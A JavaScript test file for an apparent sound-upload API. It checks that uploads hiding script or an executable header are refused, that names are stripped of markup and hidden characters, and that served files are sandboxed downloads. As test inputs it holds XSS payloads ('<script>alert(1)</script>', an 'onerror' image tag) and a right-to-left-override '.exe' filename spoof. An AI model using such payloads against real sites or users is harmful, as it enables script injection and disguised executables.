test("an upload with code inside is refused; names lose markup and hidden characters", async () => {
  const env = store();
  const up = file => call(env, "/v1/sounds", { method: "POST",
    form: { file: new Blob([file]), name: "x", agree: "own-cc0-v1" } });
  assert.equal((await up(mp3bytes(0, "<script>alert(1)</script>"))).status, 415);
  assert.equal((await up(cat(new Uint8Array([0x49, 0x44, 0x33, 3, 0, 0, 0, 0, 0, 0]), enc("MZ"), new Uint8Array(900)))).status, 415);
  const ok = await call(env, "/v1/sounds", { method: "POST", form: { file: mp3(),
    name: "evil\u202e3pm.exe <img src=x onerror=alert(1)>\u200b`{}\\", tags: "<b>x</b>, ok\u2066", agree: "own-cc0-v1" } });
  assert.equal(ok.status, 201);
  const row = env.DB.rows("SELECT name, tags FROM sounds")[0];
  assert.equal(row.name, "evil 3pm.exe img src=x onerror=alert(1)");
  assert.equal(row.tags, "b x /b,ok");
  assert.ok(!/[<>`{}\\\u200b-\u200f\u202a-\u202e\u2066-\u2069]/.test(row.name + row.tags));
});

test("a served file is only ever a download", async () => {
  const env = store();
  const id = await live(env);
  const f = await call(env, `/v1/sounds/${id}/file`);
  assert.equal(f.status, 200);
  assert.equal(f.headers.get("content-disposition"), `attachment; filename="${id}.mp3"`);
  assert.equal(f.headers.get("content-security-policy"), "default-src 'none'; sandbox");
  assert.equal(f.headers.get("x-content-type-options"), "nosniff");
});
